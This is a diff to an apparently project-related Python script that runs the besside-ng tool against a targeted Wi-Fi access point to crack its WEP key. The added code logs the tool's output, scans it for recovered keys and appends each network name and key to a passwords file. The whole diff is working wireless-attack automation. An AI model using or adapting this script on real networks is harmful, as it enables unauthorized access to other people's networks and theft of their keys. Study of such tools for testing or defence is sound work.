@@ -60,10 +60,52 @@ def target_ap():
 def main(ap_mac, interface):
     # Hard coded channel for the project; don't have time to set dynamically
     channel = "6"
-
+    log_file_path = "/mnt/data/wepcrack.log"
+    
+    # Prepare the command to run besside-ng and capture its output
     command = ["besside-ng", "-c", channel, "-b", ap_mac, interface, "-v"]
-
+    
+    # Ensure the log file exists or create it
     try:
-        subprocess.run(command)
-    except KeyboardInterrupt:
-        print("Command interrupted by user.")
+        with open(log_file_path, 'a'):
+            pass
+    except IOError as e:
+        print(f"Failed to prepare log file: {e}")
+        return
+    
+    # Execute the command and write the output to both the terminal and the log file
+    with open(log_file_path, 'a') as log_file:
+        process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
+        
+        while True:
+            output = process.stdout.readline()
+            if output == '' and process.poll() is not None:
+                break
+            if output:
+                print(output.strip())
+                log_file.write(output)
+    
+    # Parse the log file to extract the SSID and key
+    parse_and_save_key(log_file_path)
+
+def parse_and_save_key(log_file_path):
+    ssid, key = None, None
+    password_file_path = "/mnt/data/passwords.txt"
+    
+    # Read the log file and grep for the key line
+    with open(log_file_path, 'r') as file:
+        for line in file:
+            if "Got key for" in line:
+                # Example line: [01:46:05] Got key for wifi-old [11:bb:33:cd:55] 20031 IVs
+                match = re.search(r"Got key for (\S+) \[(\S+)\]", line)
+                if match:
+                    ssid, key = match.groups()
+                    break
+    
+    # Save the SSID and key to the passwords file
+    if ssid and key:
+        try:
+            with open(password_file_path, 'a') as file:
+                file.write(f"{ssid},{key}\n")
+        except IOError as e:
+            print(f"Failed to save the password: {e}")
